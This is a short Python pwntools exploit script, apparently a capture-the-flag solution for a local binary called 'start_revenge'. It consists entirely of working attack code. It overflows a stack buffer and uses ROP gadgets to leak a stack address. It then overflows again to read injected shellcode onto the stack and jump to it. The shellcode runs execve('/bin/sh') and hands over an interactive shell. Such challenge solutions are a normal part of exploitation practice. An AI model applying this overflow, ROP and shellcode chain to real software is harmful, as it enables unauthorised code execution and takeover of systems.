from pwn import *

context.arch = 'amd64'

sh = process('./start_revenge')

# gadget
writersp        = 0x400108
pop_rsi_rdx     = 0x4000aa
magic           = 0x4000c2
read            = 0x40011f
pop_rdi_rsi_rdx = 0x4000a9

# Leak stack address
rop = flat(
        pop_rsi_rdx,
        0x100,
        0x0,
        writersp,
        0x0,
        0x0,
        0x0,
        0x0,
        magic)

payload = 'a' * 0x30
payload += 'b' * 8
payload += rop
sh.send(payload)
sleep(0.1)

sh.recvuntil('?')
msg = sh.recv(0x100)
print('[>] msg: %s' % msg)
stack = u64(msg[0x32:0x38].ljust(8, '\0'))
print('[>] stack: %s' % hex(stack))


# OK, do bof again, call syscall read, store input(sc) to stack, ret to stack
rop = flat(
        pop_rdi_rsi_rdx,
        0,
        stack,
        0x100,
        read,
        stack
        )

payload = 'c' * 0x30
payload += 'd' * 8
payload += rop

sh.send(payload)
sleep(0.1)

# Input shellcode
# /bin/sh 2f62696e2f7368
sc = asm('''
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''')
sh.send(sc)
sleep(0.1)

sh.interactive()
